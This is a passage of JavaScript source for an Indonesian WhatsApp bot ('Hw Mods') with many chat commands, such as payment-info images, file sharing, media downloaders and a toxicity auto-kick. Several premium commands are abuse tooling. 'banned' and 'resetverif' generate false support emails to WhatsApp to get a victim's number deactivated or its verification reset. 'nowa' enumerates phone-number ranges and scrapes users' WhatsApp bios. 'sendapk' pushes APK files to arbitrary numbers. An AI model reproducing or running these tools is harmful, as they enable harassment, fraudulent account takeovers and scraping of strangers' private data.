Packages   : com.whatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'pdana': {
var image = generateWAMessageFromContent(from, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/ArtVc-aoRGq-BDs5ryzdbzeP2NxbXtH9qXS6YD_PUANb.enc",
"mimetype": "image/jpeg",
"fileSha256": "XLq70ROHYmTaiJTtf5rGi6q0FukmSU25OJclXVNnaFg=",
"fileLength": "136476",
"height": 1369,
"width": 984,
"caption": `DANA : 085714170944`,
"mediaKey": "jVs2Qrj6spaghWWvOJztanfBEK9I/yze1CSRzFPKshc=",
"fileEncSha256": "mw7pi0kOX/z6WojQBiy0f1usnbPA9nMIo3v44qIAG7Q=",
"directPath": "/v/t62.7118-24/33525638_1631328093997508_6020395146093552228_n.enc?ccb=11-4&oh=01_AdT2_dU6i1qGoURm1qUz2O1IUps3dinC0qU4ep9JJVJaaw&oe=63E7BCC3",
"mediaKeyTimestamp": "1673547644",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMwMBIgACEQEDEQH/xAAtAAEAAwEBAQAAAAAAAAAAAAAAAQIGAwUEAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA0soJch1cuoA8P3PCOU07HPRZfUADP6DwT5a/dB8Wqz2gJBS0rKTakTKVAAVCZAD/xAAmEAEAAQMEAgEEAwAAAAAAAAABAgADEQQQEiEiMRMgM0FxFFFh/9oACAEBAAE/AAIgBgNu673npdPOTKVoXaV+zFRmCVC9aksfmMvoq5KNsit4KhetRVbph9UIgj1vrbL89yZP89xqTKOHiCYqa3M84iHqrsQtw8sFaY42LZ/m+vF1L3xPeajOTGJKYsmpWjlllkPQUtvPGGRHNWvtw/W+u5x1rJQg9FRYj5ZJHquT8j5+C9NAcc9Pl7/NWPsw/W+ssXp6maHWajYvQEYZcVGyuQs4qWmWOIQlGS1ZEtQJew2u25MxzSS49Vxl0tMVKYA0R/v6ORX8iMZYxVu7GZk3EkCOR2Y02wlnP0f/xAAVEQEBAAAAAAAAAAAAAAAAAAAwEf/aAAgBAgEBPwBKH//EABcRAQADAAAAAAAAAAAAAAAAABEAIDD/2gAIAQMBAT8A0I3/AP/Z",
"scansSidecar": "O14M3Hv55JXfBlo5vKZFxaM23MDlB9nErmbENE53dM9+pJ3ti2Lr7Q==",
"scanLengths": [
12031,
84766,
19769,
19910
],
"midQualityFileSha256": "tcYRNyQlsf/9dNTG81Sp5rXC8PtNbzsocm/l7RrOvZs=",
}
}), { userJid: from })
haikal.relayMessage(from, image.message, { messageId: image.key.id })
}
break

case 'pgopay': {
var image = generateWAMessageFromContent(from, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AkERheDpnRAsvGunUhCBebz7YIyGOX5cuSHhPh0B_krT.enc",
"mimetype": "image/jpeg",
"fileSha256": "UIkQtCVaNY4D/Pa2gc3oqri/YupUhOARPKf6JkABs38=",
"fileLength": "112357",
"height": 1098,
"width": 1080,
    "caption": `GOPAY : 085714170944`,
"mediaKey": "aCK72k/1m+ni8wR90AKbUwsuKKOWuFWoV//gkOdHy9E=",
"fileEncSha256": "c/oB48YNSX2mXa7xHJhV3EIdpS4QNBCKSQ75T71KkcY=",
"directPath": "/v/t62.7118-24/31426466_211823664645258_5244269355491505162_n.enc?ccb=11-4&oh=01_AdQPFxaXYm1XoqwW51T4MmLHQf9CcBEpG_GjJsRJbgY-iw&oe=63E7AFA6",
"mediaKeyTimestamp": "1673547825",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEUAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQACAwEAAAAAAAAAAAAAAAAEBQABAgP/2gAMAwEAAhADEAAAAOri04Clj6LN87i4vLZTMv0hIC45PP6XPMVXfRArJ6y1XSjllq/RgBtsGLXzyV9KXSOdoXTRLdFlkL+6SDMedzt3OKWvYiJLsSu8srN7x3yANvXMGudZC82gJYBJsAx1/8QALRAAAgEDAQYEBgMAAAAAAAAAAQIAAxESIQQFEzEycRBBUVIVIjNCYWIUI4H/2gAIAQEAAT8A256grhFe0LVx95l6/vMNWsDYuZxqvvM41X3mcar7zFr1ch85i6gdpvH68uJlLjzEYgnQeK9Q7xele03l9fwqV+GwXAeg0i1kIUFFyh2mnmBw8R+RKm0YvbAanTSVdSDYC4i9Q7xele03ipNeYsPKPRLVBy1jUqjOMbLKRfJ+IeytMEL2I5yuuLhfQQKbqfzF6V7Tbh/beX+WVON/KVkcIORMNRqlY8zaOyVn0AJErWOOPUp5DzmjMCfaIqjODkO03gSHmRldzmAVJBMZ2FRVVfLVpTWqxcALr5+kWniM2pjRbRiqtoLDESnUBP8AsXpHabeL1Y2ixcXuWSE01W2A1gqKrCyCPXvYYjnKjs75EaxVKte3Mxele03hkK9x6Qm/lEqACxEdsyLTCEWMX1MW2Qi9I7SvsgrNleHd1x1T4X+8G7LHrnw/94d23++fDf2g3eAQcvD/xAAiEQABAwQBBQEAAAAAAAAAAAABAAIREBMyUQMSISIxcWH/2gAIAQIBAT8AYPFqj8CgaUDVOPAIkye6k7KbgPlGYhH2iZQxHynHiFbE4roZqoe4eirj9q4/auP3T//EACYRAAEDAgUDBQAAAAAAAAAAAAEAAgMRUhASEzFxISMyIkJRcpH/2gAIAQMBAT8Amd3H9Tus3w4/qzOuKDnXHCcHVfymsblHpGyyMtCkHcdygpTSRyHVo4TQGigTqZz9jhP5vQmcG+ZRmmHuKFSak7lBGKNxJLVoRWrQitWjFbh//9k=",
"scansSidecar": "3SuDJZs9+s0zy7joaHQUtFsPhpXAyECw7tJ82i6/ddiBcHfSHmM6Tg==",
"scanLengths": [
13724,
77106,
10257,
11270
],
"midQualityFileSha256": "m34qS6btm3Md5Js4pu9415/bMVKhHmPKlQfzpw+GW8k="
}
}), { userJid: from })
haikal.relayMessage(from, image.message, { messageId: image.key.id })
}
break

case 'pbca': {
var image = generateWAMessageFromContent(from, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AknwfqRu8ivKPIUOLGWoxq7b5zm5jytVyI_-YJmY6kZr.enc",
"mimetype": "image/jpeg",
"fileSha256": "tzdSKEnjTTevVxxrb20t2Ux3VrMiJjvbqKOogFCSdHY=",
"fileLength": "183903",
"height": 1240,
"width": 874,
    "caption": `Rek BCA : 2832657396`,
"mediaKey": "OJQygif+xhRaAtZ8Gdqyj9WakrgcuiIr3kp2WAP9L40=",
"fileEncSha256": "/PLR/yZyBR8SavrUngnnlvsacAb2xOgaszwdKVflZgE=",
"directPath": "/v/t62.7118-24/33310711_200948159138701_2267000136953121123_n.enc?ccb=11-4&oh=01_AdTWXtGlXlrIdiprtE6JJGvrci9aCo2_o6CSGmdcLWv5fQ&oe=63E7CA64",
"mediaKeyTimestamp": "1673547948",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMwMBIgACEQEDEQH/xAAtAAACAwEBAAAAAAAAAAAAAAAAAQIDBAUGAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA9BJsjKmRYpIrJg6bsRA5Ezs7OR1xABg3ZTllgT7HP3jEEUwgnRWltQAFbAmAqygmkBf/xAAmEAACAQQBAgYDAAAAAAAAAAABAgADBBESIBATBSExMkFRFDOR/9oACAEBAAE/AAJiZGcZ64h6uib7fMBGRxr1uym2uYL9GXIWC+X5pyjdCs5UIeF9+tR9mENtqoMZXAVqn8lm6msQOHiC7UhBUCKmBmE74YSyRe+zfPC7RqlPCpsZ+HXz7RDZ1l9ktqNSm+W4bibQsfubCZzwqhija+stVrKG7vAswPksVmJ81x1bODiEVj6GD0GZ/8QAGREBAAIDAAAAAAAAAAAAAAAAEQEQICEw/9oACAECAQE/AOppcYkr/8QAFhEAAwAAAAAAAAAAAAAAAAAAEBFA/9oACAEDAQE/AIkP/9k=",
"scansSidecar": "Tnf3XnWv3AeqXQvCbtX65hZBYw3ssSVt9TVGWVL+7TpXmNOjHh1nKw==",
"scanLengths": [
12532,
110828,
26356,
34187
],
"midQualityFileSha256": "HXQDGJgCdCvxMjKS21BaY+BD6jsCXVBNSg7w04d3/wU="
}
}), { userJid: from })
haikal.relayMessage(from, image.message, { messageId: image.key.id })
}
break
//=================================================//

case 'tutorial': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//
case 'belajarkita': {
if (!isPrem) return replyprem(mess.premium)
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ah3W96XRKFP1U7LSM1DvTeP81MpC75EBgDUYYQt9B5mF.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Belajar Bersama_1.11.apk",
"fileSha256": "PdBsdG3dTVg+CAiJJzqlcU/Wc1DHAloGQKV0n5vo30s=",
"fileLength": "7249993",
"pageCount": 0,
"mediaKey": "wnhI3PodfZqLKQbbEBQFYBxlb7n1WBhwWbPfuPQJm/8=",
"fileName": "Belajar Bersama_1.11.apk",
"fileEncSha256": "LAmKijY7XCKJrONV0cBXPiCNVYJdYLMjMOsi+q4pd2g=",
"directPath": "/v/t62.7119-24/34960356_543134977691326_1792059771773909536_n.enc?ccb=11-4&oh=01_AdQHN60wPp2-oLvINncKbeOse99hDWzyfjN2G4S0G4kr1g&oe=63C591FA",
"mediaKeyTimestamp": "1671207354",
"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Hw Mods Aman Dan Terpercaya Selamat Belajar ❤️",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
case 'infoamgeekz': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

📮 _*Syarat & Ketentuan*_

1. _Fitur lupa password sudah bisa digunakan jadi pastikan email aktif kalian sudah di tambahkan di panel kami._
2. _Selalu backup data_
3. _Jangan beritahukan user password kepada orang lain ( kami tidak bertanggung jawab dengan hal ini )_

_*sebelumnya kami mengalami kasus dimana user kami menjual akunnya ke orang lain dan selang beberapa hari meminta kami untuk reset password hal ini membuat nama panel kami dibilang scam untuk menanggulangi hal ini kami tidak akan lagi membantu melakukan reset password.*` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'redemcode': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `*CARA MASUKAN KODE REDDEM AMGEEKZ*
- _TEKAN ICON KOIN/SALDO DIATAS_
- _PILIH KODE REDDEM_
- _MASUKAN KODE YANG DI KIRIM ADMIN_
- _TEKAN REDDEM_

*CREATE SERVER DI AMGEEKZ PANEL*
- _TEKAN POJOK KIRI ATAS_
- _PILIH SERVER_
- _TEKAN CREATE SERVER_
- _MASUKAN NAMA_
- _SOFTWARE/GAMES : NODEJS_
- _SPECIFICATION : NODEJS_
- _NODE : PILIH SERVER YANG DI INGINKAN_
- _PILIH PAKET_
- _TEKAN MANAGE_` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break

//=================================================//
case 'bagaimanakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'nowa': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('lah?')
m.reply('Sabar Cuy Loading')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'addpdf':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${q}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Masukan query')
let teks = `${q}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
case 'listpdf': {
if (!isPrem) return replyprem(mess.premium)
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Haikal + sambil reply pesan target* \n\n Contoh 2 : yopdf Haikal`
m.reply(teksoooo)
}
break
case 'yopdf':{
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break

case 'sendpdf': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'larangan': case 'peraturan': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot Hw Mods
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': {
kicee = m.sender
await haikal.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
}
break
case 'addzip':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Nama zip apa')
let teks = `${q}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${q}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
case 'listzip': {
if (!isPrem) return replyprem(mess.premium)
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Haikal + sambil reply pesan target* \n\n Contoh 2 : yozip Haikal`
m.reply(teksooooo)
}
break
case 'yozip':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendzip': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
case 'addapk':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Nama apk apa')
let teks = `${q}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${q}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
case 'listapk': {
if (!isPrem) return replyprem(mess.premium)
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Haikal + sambil reply pesan target* \n\n Contoh 2 : yoapk Haikal`
m.reply(teksoooooo)
}
break
case 'yoapk':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendapk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
await fsx.copy(delb, `./database/Audio/${q}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
case 'delvn':{
if (!isPrem) return replyprem(mess.premium)
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(q)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${q}.mp3`)
reply(`Sukses delete vn ${q}`)
}
break
case 'listvn':{
let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnye.length}*`
reply(teksooo)
}
break
//=================================================//
case 'assalamualaikum': case 'p': {
m.reply(`Waalaikumsalam`)
}
break
//=================================================//
case 'banned': {
if (!isPrem) return replyprem(mess.premium)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `BANNED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` HW MODS WA`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
headerType: 1
}
haikal.sendMessage(from, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
if (!isPrem) return replyprem(mess.premium)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` HW MODS WA`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
headerType: 1
}
haikal.sendMessage(from, message, { quoted:m })
}
break
//=================================================//
case 'resetverif': {
if (!isPrem) return replyprem(mess.premium)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` HW MODS WA`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
headerType: 1
}
haikal.sendMessage(from, message, { quoted:m })
}
break


//=================================================//
case "fbvideo": case "fbreels":{
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply('Link nya kak?\n\nContoh : .facebook https://www.facebook.com/reel/478437244198357')
m.reply('Sabar Cuy Loading')
let res = await facebook(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "igvideo": case "igreels":{
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply('Link nya kak?\n\nContoh : .instagram https://www.instagram.com/tv/CEjIHlnpyvI/?igshid=NTdlMDg3MTY=')
m.reply('Sabar Cuy Loading')
let res = await instagram(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "twitvideo":{
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
m.reply('Sabar Cuy Loading')
let res = await twitter(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "tiktokvideo":{
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply (`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await haikal.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'hw1': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw1,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw2': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw2,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw3': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw3,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw4': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw4,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw5': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw5,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw6': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw6,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw7': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw7,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw8': {
if (!isPrem) return replyprem(mess.premium)
